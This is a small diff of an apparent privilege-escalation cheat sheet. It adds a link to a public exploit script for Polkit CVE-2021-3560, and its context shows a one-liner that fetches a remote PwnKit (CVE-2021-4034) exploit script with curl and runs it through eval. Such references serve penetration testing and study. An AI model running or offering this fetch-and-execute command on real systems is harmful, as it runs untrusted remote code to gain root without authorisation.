@@ -170,4 +170,9 @@ https://github.com/berdav/CVE-2021-4034
 One liner : eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
 ```
 
+CVE-2021-3560
+```markdown
+https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py
+```
+
 ### Windows
